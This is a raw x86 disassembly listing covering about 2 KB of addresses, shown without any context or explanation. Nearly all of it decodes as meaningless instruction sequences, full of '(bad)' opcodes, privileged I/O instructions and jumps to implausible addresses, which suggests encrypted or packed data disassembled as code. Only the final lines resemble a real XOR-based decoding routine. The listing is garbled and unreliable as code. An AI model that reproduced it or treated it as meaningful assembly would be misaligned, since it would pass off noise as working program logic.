  4228eb:	cmp    ebp,DWORD PTR ds:[ecx]
  4228ee:	jl     0x42292a
  4228f0:	ins    BYTE PTR es:[edi],dx
  4228f1:	leave  
  4228f2:	scas   al,BYTE PTR es:[edi]
  4228f3:	push   DWORD PTR [ecx+ebp*4]
  4228f6:	imul   eax,esi,0x67
  4228f9:	cmp    DWORD PTR [esp+edx*8],0x91833057
  422900:	sub    bh,dl
  422902:	and    BYTE PTR [ebp+0x245196b9],bh
  422908:	mov    ecx,0xa14cfaf5
  42290d:	outs   dx,BYTE PTR ds:[esi]
  42290e:	adc    dl,al
  422910:	or     eax,0x5b5f7484
  422915:	sbb    eax,0x6fd58f10
  42291a:	xor    al,0xad
  42291c:	pushfw 
  42291e:	popf   
  42291f:	xchg   edx,eax
  422920:	and    eax,esi
  422922:	cmp    edi,DWORD PTR [edx+0x4dbc744f]
  422928:	mov    ch,0x53
  42292a:	aas    
  42292b:	sbb    eax,0xbcc5ad8f
  422930:	cmp    ch,BYTE PTR [ecx]
  422932:	pop    edx
  422933:	(bad)  
  422934:	test   eax,0xeb3a0ae4
  422939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42293b:	int    0x2f
  42293d:	daa    
  42293e:	repnz in eax,dx
  422940:	iret   
  422941:	mov    al,bl
  422943:	pop    es
  422944:	mov    al,ds:0x196c022e
  422949:	or     al,0xf1
  42294b:	xchg   esi,eax
  42294c:	sub    ch,BYTE PTR [edi-0x43]
  42294f:	loope  0x4228e1
  422951:	ret    0x51b8
  422954:	js     0x422993
  422956:	call   0x824b:0x6128244
  42295d:	fcomp  st(4)
  42295f:	mov    ebp,DWORD PTR [edx-0x50]
  422962:	jo     0x42294b
  422964:	xor    esi,DWORD PTR [edx]
  422966:	es mov al,0xbc
  422969:	test   DWORD PTR [edx-0x60a7475b],0x5e583cf8
  422973:	add    BYTE PTR [edx],ch
  422975:	daa    
  422976:	add    eax,DWORD PTR [ebp+edx*2+0x14123b18]
  42297d:	fnsave [esi+0x3c]
  422980:	sbb    esi,DWORD PTR [ecx+0x4f]
  422983:	jo     0x422905
  422985:	inc    edi
  422986:	and    eax,DWORD PTR [eax]
  422988:	hlt    
  422989:	ds fucomi st,st(1)
  42298c:	ss push ss
  42298e:	xor    cl,0x6b
  422991:	add    DWORD PTR [ebx-0x49],edi
  422994:	int3   
  422995:	out    0x2b,eax
  422997:	shl    BYTE PTR [esi],0x5f
  42299a:	outs   dx,DWORD PTR ds:[esi]
  42299b:	pop    esi
  42299c:	mov    cl,0x46
  42299e:	xchg   esi,eax
  42299f:	and    eax,0xca62f038
  4229a4:	outs   dx,DWORD PTR ds:[esi]
  4229a5:	sbb    DWORD PTR [edx],edi
  4229a7:	xchg   ebx,eax
  4229a8:	add    eax,0xb6ad0a17
  4229ad:	jle    0x422930
  4229af:	push   0xe23f3a3b
  4229b4:	xchg   edx,eax
  4229b5:	mov    al,bl
  4229b7:	cmp    bl,ch
  4229b9:	cmp    edx,DWORD PTR [eax]
  4229bb:	cmc    
  4229bc:	enter  0xdc5a,0x18
  4229c0:	add    BYTE PTR [eax-0x4d],dh
  4229c3:	pop    eax
  4229c4:	and    edx,DWORD PTR [ebp+0x3079e28a]
  4229ca:	add    BYTE PTR [ebx+0x44],bl
  4229cd:	mov    cs,edx
  4229cf:	outs   dx,DWORD PTR ds:[esi]
  4229d0:	and    DWORD PTR [ebx],edx
  4229d2:	jns    0x4229e7
  4229d4:	scas   al,BYTE PTR es:[edi]
  4229d5:	cdq    
  4229d6:	dec    ecx
  4229d7:	sbb    eax,0x58f5288c
  4229dc:	cli    
  4229dd:	mov    esp,0x2af9f0ea
  4229e2:	add    dh,BYTE PTR [ecx]
  4229e4:	push   ds
  4229e5:	(bad)  
  4229e6:	js     0x422a42
  4229e8:	jne    0x422a2f
  4229ea:	aad    0x49
  4229ec:	cld    
  4229ed:	fwait
  4229ee:	push   esp
  4229ef:	fs push 0x7605805f
  4229f5:	cld    
  4229f6:	or     BYTE PTR [edx],cl
  4229f8:	pop    esi
  4229f9:	(bad)  
  4229fa:	pop    ss
  4229fb:	out    dx,eax
  4229fc:	jge    0x42299c
  4229fe:	out    dx,al
  4229ff:	add    eax,0x198ffb83
  422a04:	add    eax,0x50a39280
  422a09:	push   ebx
  422a0a:	dec    eax
  422a0b:	mov    ?,WORD PTR [eax]
  422a0d:	pushf  
  422a0e:	xchg   ebx,eax
  422a0f:	aaa    
  422a10:	test   al,dl
  422a12:	adc    BYTE PTR [esi],0x6b
  422a15:	jmp    FWORD PTR [edx+eax*4]
  422a18:	or     BYTE PTR [edi],al
  422a1a:	inc    eax
  422a1b:	jle    0x422a8e
  422a1d:	in     al,dx
  422a1e:	cs dec ecx
  422a20:	fst    QWORD PTR [ecx+0x32310018]
  422a26:	xor    dh,BYTE PTR [esi]
  422a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a29:	into   
  422a2a:	xchg   BYTE PTR [edi+0x2b],cl
  422a2d:	push   edi
  422a2e:	xchg   esp,eax
  422a2f:	int    0x21
  422a31:	xchg   edi,eax
  422a32:	pop    ecx
  422a33:	jmp    0x24614c12
  422a38:	jg     0x4229ea
  422a3a:	sub    BYTE PTR [ecx],0xfd
  422a3d:	pop    ss
  422a3e:	xor    BYTE PTR [edi+0x2a9d220],dl
  422a44:	lahf   
  422a45:	sub    edx,DWORD PTR [edx-0x1532d9e0]
  422a4b:	bswap  ebp
  422a4d:	cmp    BYTE PTR [ecx+0x6823c43c],0x2
  422a54:	sub    eax,0xdaae19bb
  422a59:	xchg   BYTE PTR [esi],ah
  422a5b:	fstp   TBYTE PTR [edi+0x49]
  422a5e:	pop    ebx
  422a5f:	mov    esi,0xfee34f82
  422a64:	xchg   edi,eax
  422a65:	mov    al,ds:0x79819ac6
  422a6a:	loopne 0x422ada
  422a6c:	jae    0x422ab8
  422a6e:	lds    ebp,FWORD PTR [ebp-0x64e05d1e]
  422a74:	pop    esi
  422a75:	mov    WORD PTR [ebx+0x30],di
  422a79:	(bad)  
  422a7a:	dec    BYTE PTR [ecx]
  422a7c:	mov    ds:0x626ea22b,eax
  422a81:	cmp    eax,0x2254aaaf
  422a86:	and    eax,0x40e95072
  422a8b:	pop    ebp
  422a8c:	push   eax
  422a8d:	(bad)  
  422a8e:	mov    ebx,0x1670f2e1
  422a93:	stc    
  422a94:	rcr    BYTE PTR [ecx+0x28],0x8
  422a98:	pop    es
  422a99:	mov    ecx,0xa7e3dcab
  422a9e:	inc    ebp
  422a9f:	rol    DWORD PTR [esi-0x6d92a7b7],1
  422aa5:	pop    ebx
  422aa6:	cli    
  422aa7:	jl     0x422a4f
  422aa9:	ins    DWORD PTR es:[edi],dx
  422aaa:	pop    esi
  422aab:	xor    al,0x5
  422aad:	aas    
  422aae:	mov    edx,0x631f8f7c
  422ab3:	test   DWORD PTR [ebx],edx
  422ab5:	in     eax,dx
  422ab6:	xchg   ebp,eax
  422ab7:	stos   BYTE PTR es:[edi],al
  422ab8:	inc    esi
  422ab9:	mov    ebp,0x7d2d2e62
  422abe:	jecxz  0x422af8
  422ac0:	scas   al,BYTE PTR es:[edi]
  422ac1:	aad    0xd6
  422ac3:	jae    0x422b08
  422ac5:	cdq    
  422ac6:	fdivr  st(1),st
  422ac8:	sbb    bh,al
  422aca:	lods   al,BYTE PTR ds:[esi]
  422acb:	mov    BYTE PTR [eax+0x5ca7899d],dl
  422ad1:	(bad)  
  422ad2:	jmp    0x591a913a
  422ad7:	mov    al,ds:0x951405d7
  422adc:	and    edi,edi
  422ade:	(bad)  
  422adf:	push   esp
  422ae0:	push   esi
  422ae1:	inc    esi
  422ae2:	ficomp DWORD PTR [ebx-0x2c]
  422ae5:	jl     0x422b56
  422ae7:	aam    0x13
  422ae9:	mov    dh,dl
  422aeb:	clc    
  422aec:	int    0xa8
  422aee:	fcomp  DWORD PTR [edx+0x3794d0d9]
  422af4:	xor    eax,DWORD PTR [ebx+0x7b]
  422af7:	adc    eax,0xaf12887
  422afc:	dec    edx
  422afd:	aas    
  422afe:	push   0x47
  422b00:	std    
  422b01:	adc    eax,0x9144be8a
  422b06:	mov    edx,0x3cf4161b
  422b0b:	cld    
  422b0c:	jno    0x422b5d
  422b0e:	ins    BYTE PTR es:[edi],dx
  422b0f:	mov    eax,0xfccc8568
  422b14:	fstp   TBYTE PTR fs:[eax]
  422b17:	repnz dec ecx
  422b19:	jmp    0x89c1ffc8
  422b1e:	dec    esi
  422b1f:	fld    st(0)
  422b21:	or     DWORD PTR [bp+di-0x78],edi
  422b25:	dec    ebp
  422b26:	lds    ebp,FWORD PTR [ecx-0x112ffc1]
  422b2c:	xor    DWORD PTR [esi-0x68876aa7],esi
  422b32:	enter  0x7c8d,0x60
  422b36:	xchg   esi,eax
  422b37:	popf   
  422b38:	imul   esp,DWORD PTR [ecx-0x6],0xd6a56ed5
  422b3f:	or     eax,0x7507c211
  422b44:	test   DWORD PTR [edx+0x1c],0x2c527ef5
  422b4b:	fld    st(3)
  422b4d:	inc    edx
  422b4e:	outs   dx,BYTE PTR ds:[esi]
  422b4f:	cdq    
  422b50:	jmp    0x422adb
  422b52:	pop    ds
  422b53:	daa    
  422b54:	and    DWORD PTR [eax-0x16],0x2fb839c0
  422b5b:	mov    ds:0xcf9bc021,eax
  422b60:	repnz sub al,0xc8
  422b63:	and    DWORD PTR [ebx+esi*8],0xf844038c
  422b6a:	push   0xffffffe0
  422b6c:	fimul  WORD PTR [ebp+eax*8+0x48]
  422b70:	pop    edi
  422b71:	test   eax,0xc76e72a4
  422b76:	sub    DWORD PTR [edx+esi*1+0x7d458b93],ebp
  422b7d:	add    al,0x97
  422b7f:	scas   al,BYTE PTR es:[edi]
  422b80:	das    
  422b81:	sahf   
  422b82:	xchg   edx,eax
  422b83:	mov    WORD PTR [edi+0x7bfd35ee],?
  422b89:	sbb    edx,DWORD PTR [esi]
  422b8b:	mov    bl,0x23
  422b8d:	xchg   ecx,eax
  422b8e:	add    al,0x95
  422b90:	fucom  st(0)
  422b92:	add    DWORD PTR ds:0x25f6d0fd,edi
  422b98:	ds loope 0x422b55
  422b9b:	(bad)  
  422b9d:	je     0x422b4b
  422b9f:	lods   al,BYTE PTR ds:[esi]
  422ba0:	sbb    DWORD PTR [eax-0x565d0764],esp
  422ba6:	xlat   BYTE PTR ds:[ebx]
  422ba7:	retf   0x20e0
  422baa:	and    DWORD PTR [ecx],eax
  422bac:	sbb    DWORD PTR [edi-0x3fb3c24f],esp
  422bb2:	adc    DWORD PTR [ebp-0x61],ebx
  422bb5:	ret    
  422bb6:	jg     0x422c1e
  422bb8:	jne    0x422b95
  422bba:	and    edi,DWORD PTR [esp+edi*2-0x6d82a84d]
  422bc1:	fdivr  st,st(1)
  422bc3:	add    BYTE PTR [ecx+0xde8d87c],0x27
  422bca:	jno    0x422c40
  422bcc:	pop    esi
  422bcd:	gs lock loopne 0x422c17
  422bd1:	or     BYTE PTR [edx-0x78],ah
  422bd4:	das    
  422bd5:	cmc    
  422bd6:	mov    ds:0x7168f65,eax
  422bdb:	cld    
  422bdc:	inc    ebp
  422bdd:	nop
  422bde:	adc    cl,BYTE PTR [ebx+edx*2+0x35]
  422be2:	icebp  
  422be3:	repz push edx
  422be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422be6:	iret   
  422be7:	mov    esi,0xda64f033
  422bec:	in     al,dx
  422bed:	fsubr  QWORD PTR [ebx+0x3]
  422bf0:	pop    ss
  422bf1:	and    al,BYTE PTR [esi+edi*2-0x69]
  422bf5:	clc    
  422bf6:	inc    ebp
  422bf7:	mov    al,0x46
  422bf9:	or     eax,0xd276c6b9
  422bfe:	repnz adc eax,0xf5a9cd43
  422c04:	lahf   
  422c05:	pop    edx
  422c06:	mov    edx,0x94ed8cc1
  422c0b:	cmc    
  422c0c:	xchg   DWORD PTR [edi-0x1885b862],esi
  422c12:	arpl   WORD PTR [ebp-0x76229631],ax
  422c18:	out    dx,al
  422c19:	xchg   esp,eax
  422c1a:	fmul   st,st(0)
  422c1c:	fadd   DWORD PTR [ebx-0x75]
  422c1f:	out    0x5c,eax
  422c21:	xor    esp,ecx
  422c23:	inc    esp
  422c24:	mov    esi,0xdb6e3602
  422c29:	push   ecx
  422c2a:	retf   0x3f51
  422c2d:	mov    esp,0xc1ff6551
  422c32:	shr    DWORD PTR [ebx-0x4a],cl
  422c35:	fdivr  st,st(6)
  422c37:	fcomi  st,st(5)
  422c39:	inc    ebx
  422c3a:	jle    0x422c08
  422c3c:	cs sub esp,ebx
  422c3f:	les    edi,FWORD PTR [esi]
  422c41:	sbb    ebx,DWORD PTR [edi+ecx*8+0x6e]
  422c45:	minps  xmm0,xmm3
  422c48:	sbb    dl,ch
  422c4a:	int3   
  422c4b:	mov    cs,WORD PTR [edi-0x3709bb96]
  422c51:	call   0x2af5bc9
  422c56:	mov    edi,0xc0a9510d
  422c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c5c:	fnstsw WORD PTR [edi+esi*1+0x4ec42e5b]
  422c63:	inc    ebp
  422c64:	pop    ss
  422c65:	gs retf 
  422c67:	outs   dx,BYTE PTR ds:[esi]
  422c68:	test   DWORD PTR [ebx-0x4f905d04],ecx
  422c6e:	adc    al,BYTE PTR ds:0x5e10c805
  422c74:	ret    
  422c75:	mov    esp,DWORD PTR [edi+0x50900b37]
  422c7b:	retf   
  422c7c:	push   esi
  422c7d:	mov    ds:0xbbf2a4d3,eax
  422c82:	es aas 
  422c84:	stos   DWORD PTR es:[edi],eax
  422c85:	push   ds
  422c86:	dec    ebx
  422c87:	stc    
  422c88:	popf   
  422c89:	ret    0x8d28
  422c8c:	inc    eax
  422c8d:	dec    edi
  422c8e:	or     ecx,ecx
  422c90:	jno    0x422d04
  422c92:	aad    0xaf
  422c94:	mov    ebx,0xe01c9ea4
  422c99:	push   ebp
  422c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c9b:	mov    cl,0x98
  422c9d:	sbb    dh,bl
  422c9f:	xlat   BYTE PTR ds:[ebx]
  422ca0:	push   es
  422ca1:	mov    al,ds:0x8d23fee2
  422ca6:	aad    0xe2
  422ca8:	mov    DWORD PTR [esi],ebx
  422caa:	int    0xa2
  422cac:	add    al,0xa0
  422cae:	dec    ecx
  422caf:	cwde   
  422cb0:	push   ebx
  422cb1:	pop    ebp
  422cb2:	retf   
  422cb3:	mov    DWORD PTR [ebx-0x4e],ecx
  422cb6:	popf   
  422cb7:	loope  0x422c91
  422cb9:	push   ecx
  422cba:	(bad)  
  422cbb:	sti    
  422cbc:	push   cs
  422cbd:	dec    esi
  422cbe:	or     edx,ecx
  422cc0:	stos   DWORD PTR es:[edi],eax
  422cc1:	inc    edx
  422cc2:	data16 mov al,bh
  422cc5:	jns    0x422d05
  422cc7:	dec    ebx
  422cc8:	scas   al,BYTE PTR es:[edi]
  422cc9:	outs   dx,DWORD PTR ds:[esi]
  422cca:	mov    edx,0x2ce342eb
  422ccf:	mov    dh,0xf7
  422cd1:	xor    dh,BYTE PTR [edi-0x19]
  422cd4:	mov    bl,0x69
  422cd6:	adc    BYTE PTR [ebp+0x68d74850],bh
  422cdc:	mov    eax,0x3e63460a
  422ce1:	retf   
  422ce2:	sub    al,0xf7
  422ce4:	xor    BYTE PTR [ecx],cl
  422ce6:	sbb    al,0xf4
  422ce8:	cmp    DWORD PTR [esi],edi
  422cea:	push   cs
  422ceb:	(bad)  
  422cec:	pop    ds
  422ced:	mov    ch,0x38
  422cef:	cmp    eax,0x26b3e267
  422cf4:	push   0xffffff95
  422cf6:	and    BYTE PTR [eax],cl
  422cf8:	inc    eax
  422cf9:	ror    DWORD PTR [eax],0xe2
  422cfc:	or     ebx,DWORD PTR [ebx-0x69c16963]
  422d02:	mov    al,ds:0xd99002ed
  422d07:	fnstsw WORD PTR [ebp+0x19de8908]
  422d0d:	fdivrp st(5),st
  422d0f:	cmp    eax,0xf271820b
  422d14:	inc    edi
  422d15:	or     edi,eax
  422d17:	xchg   BYTE PTR [ebx+0x40],bh
  422d1a:	inc    ebp
  422d1b:	(bad)  
  422d1c:	icebp  
  422d1d:	xchg   DWORD PTR [esi+0x7d],ecx
  422d20:	in     al,dx
  422d21:	fimul  DWORD PTR [eax+0x63]
  422d24:	test   eax,0xc3d3c10f
  422d29:	sub    ecx,DWORD PTR [edi-0x4c]
  422d2c:	popa   
  422d2d:	mov    dl,BYTE PTR [ebx+0x1b]
  422d30:	aas    
  422d31:	ror    BYTE PTR es:0xd7f3e561,0x50
  422d39:	sbb    al,0xdb
  422d3b:	sahf   
  422d3c:	mov    ebx,0x214a8bfb
  422d41:	ret    0x385b
  422d44:	mov    al,0x5e
  422d46:	and    ah,dl
  422d48:	leave  
  422d49:	scas   al,BYTE PTR es:[edi]
  422d4a:	jmp    0x422d68
  422d4c:	pop    ebx
  422d4d:	dec    ebx
  422d4e:	les    edi,FWORD PTR [esp+edi*8]
  422d51:	lods   al,BYTE PTR ds:[esi]
  422d52:	out    dx,al
  422d53:	stc    
  422d54:	mov    ebx,0x5844446c
  422d59:	call   0xf165:0xaeaf5959
  422d60:	sahf   
  422d61:	dec    ecx
  422d62:	test   eax,0xb6ca5e33
  422d67:	sub    dl,BYTE PTR [esi+0xc]
  422d6a:	or     eax,0x83e2feeb
  422d6f:	jnp    0x422dad
  422d71:	popf   
  422d72:	pop    ecx
  422d73:	add    ecx,ecx
  422d75:	(bad)  
  422d76:	pop    ebx
  422d77:	idiv   DWORD PTR [ecx]
  422d79:	je     0x422d52
  422d7b:	jmp    DWORD PTR [esi+0x6]
  422d7e:	cmp    dx,si
  422d81:	push   ss
  422d82:	popa   
  422d83:	outs   dx,DWORD PTR ds:[esi]
  422d84:	push   esp
  422d85:	(bad)  
  422d86:	frstor [edi]
  422d88:	repnz test BYTE PTR [ecx],bl
  422d8b:	push   cs
  422d8c:	in     al,dx
  422d8d:	jo     0x422d17
  422d8f:	push   0xffffffa3
  422d91:	ret    0xa8fe
  422d94:	scas   eax,DWORD PTR es:[edi]
  422d95:	pusha  
  422d96:	or     ebx,DWORD PTR [esi+edx*4-0x4886b9c8]
  422d9d:	mov    ecx,esp
  422d9f:	jge    0x422e15
  422da1:	jge    0x422d74
  422da3:	sbb    BYTE PTR ds:0xecc0e4d,cl
  422da9:	scas   eax,DWORD PTR es:[edi]
  422daa:	stc    
  422dab:	cmp    al,0x77
  422dad:	sbb    dl,bh
  422daf:	fldcw  WORD PTR [esi]
  422db1:	push   edx
  422db2:	jbe    0x422e33
  422db4:	pop    es
  422db5:	push   esi
  422db6:	push   esi
  422db7:	jns    0x422db5
  422db9:	das    
  422dba:	out    dx,eax
  422dbb:	repnz imul ebp,DWORD PTR [edx-0x30827447],0x66
  422dc3:	in     eax,dx
  422dc4:	dec    eax
  422dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dc6:	lea    eax,[ecx]
  422dc8:	mov    cs,ebx
  422dca:	inc    eax
  422dcc:	add    al,0x1c
  422dce:	jl     0x422e45
  422dd0:	cli    
  422dd1:	mov    esp,esi
  422dd3:	mov    DWORD PTR [ecx+0x6b],esp
  422dd6:	into   
  422dd7:	inc    ebp
  422dd8:	cwde   
  422dd9:	pop    ebp
  422dda:	cdq    
  422ddb:	aaa    
  422ddc:	enter  0xc2ab,0x3f
  422de0:	mov    ds:0x97c977ae,al
  422de5:	push   ecx
  422de6:	iret   
  422de7:	lods   eax,DWORD PTR ds:[esi]
  422de8:	test   BYTE PTR [ebx+0x40],bl
  422deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ded:	lods   eax,DWORD PTR ds:[esi]
  422dee:	add    al,0x3b
  422df0:	popa   
  422df1:	push   edi
  422df2:	and    ebp,DWORD PTR [esi+eax*8]
  422df5:	add    eax,0x4ea5d4d
  422dfa:	std    
  422dfb:	mov    esi,0x5a841b8e
  422e00:	not    DWORD PTR [ebp-0xb]
  422e03:	out    dx,al
  422e04:	lods   al,BYTE PTR ds:[esi]
  422e05:	xchg   edi,eax
  422e06:	add    DWORD PTR [ebp+0x29f0a651],edi
  422e0c:	ss inc edi
  422e0e:	pop    eax
  422e0f:	and    eax,0x35a9802f
  422e14:	push   esp
  422e15:	retf   0xc9d2
  422e18:	mov    cl,0xea
  422e1a:	test   al,0xaf
  422e1c:	dec    edx
  422e1d:	fsub   DWORD PTR [edx+0x2774f750]
  422e23:	retf   
  422e24:	and    al,0x2c
  422e26:	or     eax,0x978d25f0
  422e2b:	loope  0x422e40
  422e2d:	push   ss
  422e2e:	int3   
  422e2f:	or     BYTE PTR [ebp+0x77d77eb9],0x5d
  422e36:	sbb    al,0xa
  422e38:	shl    DWORD PTR [edx-0x19],0x67
  422e3c:	cli    
  422e3d:	dec    eax
  422e3e:	push   esp
  422e3f:	or     al,BYTE PTR [esi-0x565e2091]
  422e45:	cmp    ecx,edi
  422e47:	stc    
  422e48:	mov    dl,0x49
  422e4a:	sbb    al,0x65
  422e4c:	mov    edx,edx
  422e4e:	sbb    al,0xbd
  422e50:	mov    ebp,0xe27506c1
  422e55:	or     ch,BYTE PTR [esi]
  422e57:	or     DWORD PTR [edi+ecx*2+0xe],esp
  422e5b:	ror    BYTE PTR ds:0x2f672ffd,1
  422e61:	stos   BYTE PTR es:[edi],al
  422e62:	lahf   
  422e63:	dec    edx
  422e64:	in     al,dx
  422e65:	jno    0x422df1
  422e67:	les    esi,FWORD PTR [eax]
  422e69:	fidiv  DWORD PTR [esi]
  422e6b:	es cs lahf 
  422e6e:	test   eax,0xf2d0fbe4
  422e73:	out    0x76,eax
  422e75:	or     BYTE PTR [edx],ah
  422e77:	fcomp  QWORD PTR [eax+0x17]
  422e7a:	xor    al,0xfb
  422e7c:	fwait
  422e7d:	pop    ebx
  422e7e:	jae    0x422e0f
  422e80:	into   
  422e81:	sbb    al,0x62
  422e83:	push   ebp
  422e84:	aam    0x63
  422e86:	ja     0x422ebb
  422e88:	pop    es
  422e89:	xchg   DWORD PTR [ecx+0x72ffd9a4],ecx
  422e8f:	pop    ebp
  422e90:	ret    0xad01
  422e93:	mov    dh,0x41
  422e95:	hlt    
  422e96:	rol    DWORD PTR fs:[esi-0x47],1
  422e9a:	add    bl,dl
  422e9c:	leave  
  422e9d:	js     0x422e7d
  422e9f:	ja     0x422e74
  422ea1:	pop    es
  422ea2:	push   ds
  422ea3:	sub    BYTE PTR [ebx],bh
  422ea5:	popa   
  422ea6:	pop    ecx
  422ea7:	out    0x5a,al
  422ea9:	xor    BYTE PTR [eax],ah
  422eab:	in     eax,0xda
  422ead:	inc    ecx
  422eae:	into   
  422eaf:	retf   
  422eb0:	jbe    0x422ec9
  422eb2:	sbb    BYTE PTR [esi],cl
  422eb4:	out    dx,al
  422eb5:	mov    ah,0xc5
  422eb7:	ss mov ebx,0xc09c4977
  422ebd:	dec    esp
  422ebe:	xor    BYTE PTR [esi],dl
  422ec0:	and    al,BYTE PTR [ebx+0x6d3303fc]
  422ec6:	stc    
  422ec7:	int    0x3f
  422ec9:	xor    eax,0xdd3aab6f
  422ece:	mov    bh,0x17
  422ed0:	mov    ebx,0xc3a2053d
  422ed5:	xor    al,0x31
  422ed7:	pop    esi
  422ed8:	xchg   ecx,eax
  422ed9:	aam    0x7a
  422edb:	test   BYTE PTR [eax-0x7cb1ade1],dh
  422ee1:	adc    eax,0x80ca8eff
  422ee6:	cmp    eax,0x34d8df78
  422eeb:	retf   
  422eec:	jb     0x422ee0
  422eee:	aad    0xa7
  422ef0:	pop    ds
  422ef1:	inc    ebp
  422ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ef4:	dec    eax
  422ef5:	aaa    
  422ef6:	mov    eax,0x11fe4e9c
  422efb:	(bad)  
  422efc:	xor    al,0xea
  422efe:	test   eax,0xbd521dc0
  422f03:	nop
  422f04:	popf   
  422f05:	ins    DWORD PTR es:[edi],dx
  422f06:	and    DWORD PTR [esi+0x47],edx
  422f09:	(bad)  [esp+edi*1-0x4e7bfda7]
  422f10:	mov    esi,0xd1ae32ec
  422f15:	int    0x6c
  422f17:	loop   0x422f05
  422f19:	bound  esi,QWORD PTR [esi]
  422f1b:	outs   dx,BYTE PTR ds:[esi]
  422f1c:	xor    BYTE PTR [ebx-0x60],cl
  422f1f:	dec    edi
  422f20:	jnp    0x422f6c
  422f22:	int3   
  422f23:	sub    dh,al
  422f25:	add    BYTE PTR [ebx+0x762c5108],dl
  422f2b:	sbb    al,0x3c
  422f2d:	jb     0x422ee8
  422f2f:	lock sbb esp,DWORD PTR [ebp-0x7cc627a4]
  422f36:	out    dx,al
  422f37:	(bad)  
  422f38:	mov    esp,0xe3f7152b
  422f3d:	mov    DWORD PTR [edx-0x3d70a8a7],esi
  422f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f44:	jne    0x422eec
  422f46:	inc    edx
  422f47:	sbb    bh,dh
  422f49:	mov    ds:0xd5f519,eax
  422f4e:	pop    ebx
  422f4f:	xor    DWORD PTR [esi],0xbd518979
  422f55:	mov    bh,0x58
  422f57:	mov    edx,0xc692b8af
  422f5c:	inc    edx
  422f5d:	fwait
  422f5e:	xchg   esi,eax
  422f5f:	call   esp
  422f61:	add    eax,0x26c578dd
  422f67:	lea    esi,[ecx]
  422f69:	aaa    
  422f6a:	daa    
  422f6b:	mov    eax,ds:0xd6300f55
  422f70:	lock sbb DWORD PTR [eax+esi*2],ebp
  422f74:	mov    DWORD PTR [eax+edx*4+0x6a],edi
  422f78:	mov    eax,0x94ff5819
  422f7d:	ret    0x48aa
  422f80:	jp     0x422f60
  422f82:	(bad)  
  422f83:	push   edi
  422f84:	test   BYTE PTR [edi-0x73],al
  422f87:	stos   DWORD PTR es:[edi],eax
  422f88:	push   ebp
  422f89:	lea    ebp,[ecx+0x4b4cc4a1]
  422f8f:	clc    
  422f90:	pop    eax
  422f91:	popf   
  422f92:	and    DWORD PTR [edi],ecx
  422f94:	sbb    ebx,DWORD PTR [eax]
  422f96:	bound  esp,QWORD PTR [edi+0x34eb00f2]
  422f9c:	mov    ah,0x8a
  422f9e:	fld    DWORD PTR [edi+esi*8+0x7f]
  422fa2:	xchg   ecx,eax
  422fa3:	dec    edx
  422fa4:	in     al,dx
  422fa5:	add    eax,0xb02c0e92
  422faa:	cmp    DWORD PTR [eax-0x13],edx
  422fad:	adc    al,cl
  422faf:	cld    
  422fb0:	sub    al,0x56
  422fb2:	test   BYTE PTR ds:0x56f3594f,dl
  422fb8:	mov    ds:0xe13bdfe7,eax
  422fbd:	rol    BYTE PTR [edi+0x7c],cl
  422fc0:	jae    0x422f5a
  422fc2:	mov    eax,edx
  422fc4:	bound  ecx,QWORD PTR [edi]
  422fc6:	add    bl,bl
  422fc8:	mov    esp,0x3d90df11
  422fcd:	push   es
  422fce:	sbb    eax,DWORD PTR [esi+0x6eb83b7a]
  422fd4:	and    BYTE PTR [eax+0x4e92d00c],al
  422fda:	nop
  422fdb:	aad    0xfc
  422fdd:	test   edx,esp
  422fdf:	xor    edx,ebp
  422fe1:	adc    DWORD PTR [esi+ebx*1-0x50],esp
  422fe5:	adc    esp,ecx
  422fe7:	xor    al,0x13
  422fe9:	fcmovnu st,st(5)
  422feb:	jmp    0x33e2491c
  422ff0:	inc    esi
  422ff1:	dec    edi
  422ff2:	mov    DWORD PTR [ecx-0x1a7037c2],edi
  422ff8:	add    eax,0x4c253619
  422ffd:	mov    es,WORD PTR [ebx]
  422fff:	push   eax
  423000:	jbe    0x423002
  423002:	in     eax,0x40
  423004:	hlt    
  423005:	cli    
  423006:	adc    BYTE PTR ss:[ebx+ebx*2-0x29],cl
  42300b:	in     al,0x77
  42300d:	cli    
  42300e:	sub    dh,BYTE PTR [ebx+0x76]
  423011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423012:	mov    esp,DWORD PTR [ebx+0x728eae06]
  423018:	(bad)  [ebx]
  42301a:	ss and al,0xe5
  42301d:	dec    ecx
  42301e:	push   es
  42301f:	out    dx,eax
  423020:	jle    0x423079
  423022:	inc    esi
  423023:	mov    ebx,0x42d609fa
  423028:	rcr    DWORD PTR [edi+0x5994488f],1
  42302e:	sbb    DWORD PTR [edx+0xd90ec0a],0xffffffb5
  423035:	aad    0xd8
  423037:	(bad)  
  423038:	test   BYTE PTR [edi+eax*8+0x239ccc97],0xbf
  423040:	mov    ecx,0xc5a1629
  423045:	js     0xeb06b5be
  42304b:	hlt    
  42304c:	sbb    eax,0x287acd4a
  423051:	in     eax,0x9
  423053:	and    BYTE PTR [edi],bh
  423055:	mov    edi,DWORD PTR [eax-0x741433c0]
  42305b:	push   ss
  42305c:	jae    0x422fef
  42305e:	jmp    0x7467:0xd5e6cac5
  423065:	inc    esp
  423066:	mov    edx,0xd9bb1464
  42306b:	push   ds
  42306c:	call   0xfd4226dc
  423071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423072:	shr    bl,0xa1
  423075:	jno    0x423084
  423077:	(bad)  
  423078:	enter  0x8243,0xf6
  42307c:	jb     0x423016
  42307e:	mov    ds,ebp
  423080:	xor    edx,esi
  423082:	lea    eax,[edx+eax*1+0x3272db]
  423089:	movzx  edx,BYTE PTR [ebp-0x1]
  42308d:	xor    edx,eax
  42308f:	mov    BYTE PTR [ebp-0x1],dl
  423092:	mov    al,BYTE PTR [ebp-0x1]
  423095:	mov    edx,DWORD PTR [ebp-0x1c]
  423098:	mov    ebx,DWORD PTR [ebp-0xc]
  42309b:	xor    edx,esi
  42309d:	add    edx,edi
  42309f:	imul   edx,ebx
